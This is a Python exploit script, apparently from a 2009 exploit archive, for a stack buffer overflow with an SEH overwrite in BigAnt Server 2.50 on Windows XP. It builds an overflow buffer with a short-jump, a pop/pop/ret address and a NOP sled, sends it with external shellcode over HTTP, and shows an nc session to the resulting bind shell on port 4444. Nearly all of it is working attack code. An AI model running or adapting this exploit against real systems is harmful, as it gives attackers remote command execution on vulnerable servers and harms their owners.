#!/usr/bin/python
# BigAnt Server version 2.50 SEH Overwrite - 0day
# Written and discovered by Blake
# Tested on Windows XP SP3
# 
# $ ./bigant.py 192.168.1.131 6660
#
# [*] BigAnt Server v2.50 SEH Overwrite 0day
# [*] Written and discovered by Blake
# [*] Tested on Windows XP SP3
#
# [+] Connecting to 192.168.1.131 on port 6660
# [+] Sending payload
# [+] Connect to bind shell on port 4444
#
# $ nc 192.168.1.131 4444
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\WINDOWS\system32>

import socket, sys


import socket
import struct
from struct import pack
from payload import buf
import sys
def shell_attack(target_machine, target_port):
    host = target_machine
    port = target_port 	# port 6660 by default

    # windows/shell_bind_tcp - 696 bytes  Encoder: x86/alpha_mixed
    # EXITFUNC=seh, LPORT=4444, RHOST=
   


    payload = b"\x41" * 985		# seh overwritten at 989
    next_seh = b"\xeb\x06\x90\x90"   # short jump 6 bytes
    seh = b"\x6a\x19\x9a\x0f"	# p/p/r from vbajet32.dll
    nops = b"\x90" * 10		# nop sled
    sc = buf			# 710 bytes available for shellcode

   
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host,port))
    except:
       
        sys.exit(0)

   
    s.send(b"GET " + payload + next_seh + seh + nops + sc + b"\r\n\r\n")
    s.close()
    

    # milw0rm.com [2009-09-15]